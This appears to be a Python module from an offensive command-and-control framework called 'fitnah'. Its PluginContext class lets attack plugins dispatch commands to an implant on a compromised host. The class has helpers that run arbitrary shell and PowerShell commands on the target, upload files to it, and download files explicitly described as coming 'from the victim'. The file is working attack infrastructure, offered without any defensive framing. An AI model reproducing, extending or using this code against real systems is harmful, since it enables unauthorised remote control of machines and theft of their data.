"""
PluginContext — passed to every plugin's run() method.

Gives plugins a synchronous interface to dispatch commands
to the implant via the async C2 server.

Usage inside a plugin:
    def run(self, session, params, ctx=None):
        if ctx is None:
            return ModuleResult.err("No live context (offline test mode)")
        result = ctx.send("exec", {"cmd": "whoami"})
        if result["status"] != "ok":
            return ModuleResult.err(result.get("output",""))
        return ModuleResult.ok(data=result["output"])
"""
from __future__ import annotations

import asyncio
import logging
from typing import TYPE_CHECKING, Any

if TYPE_CHECKING:
    from fitnah.c2.server import C2Server
    from fitnah.orchestration.session_manager import Session

log = logging.getLogger(__name__)


class PluginContext:
    """
    Synchronous bridge between plugin logic and the async C2 dispatch layer.
    Created by the kernel for each plugin execution.
    """

    def __init__(
        self,
        session: "Session",
        c2: "C2Server",
        loop: asyncio.AbstractEventLoop,
        timeout: int = 120,
    ):
        self._session = session
        self._c2      = c2
        self._loop    = loop
        self._timeout = timeout

    def send(self, command: str, args: dict | None = None) -> dict:
        """
        Dispatch a command to the implant and block until ACK or timeout.

        Returns:
            {"status": "ok"|"error"|"timeout", "output": str, "task_id": str}
        """
        chat_id = self._session.group_id or self._session.agent_id
        coro = self._c2.dispatch(
            agent_id=self._session.agent_id,
            chat_id=chat_id,
            command=command,
            args=args or {},
        )
        future = asyncio.run_coroutine_threadsafe(coro, self._loop)
        try:
            return future.result(timeout=self._timeout)
        except TimeoutError:
            future.cancel()
            return {"status": "timeout", "output": "", "task_id": ""}
        except Exception as exc:
            future.cancel()
            log.error("[ctx] dispatch error: %s", exc)
            return {"status": "error", "output": str(exc), "task_id": ""}

    def exec(self, cmd: str) -> dict:
        """Shortcut — run a shell command."""
        return self.send("shell", {"cmd": cmd})

    def ps(self, cmd: str) -> dict:
        """Shortcut — run a PowerShell command."""
        return self.send("shell", {"cmd": f"powershell -NoProfile -NonInteractive -Command \"{cmd}\""})

    def upload(self, remote_path: str, data: bytes) -> dict:
        """Upload bytes to a path on the victim."""
        import base64
        return self.send("upload", {
            "path": remote_path,
            "data": base64.b64encode(data).decode(),
        })

    def download(self, remote_path: str) -> dict:
        """Download a file from the victim. Returns bytes in result['bytes']."""
        return self.send("download", {"path": remote_path})

    @property
    def agent_id(self) -> str:
        return self._session.agent_id

    @property
    def hostname(self) -> str:
        return self._session.hostname

    @property
    def os(self) -> str:
        return self._session.os

    @property
    def priv(self) -> str:
        return self._session.priv_level
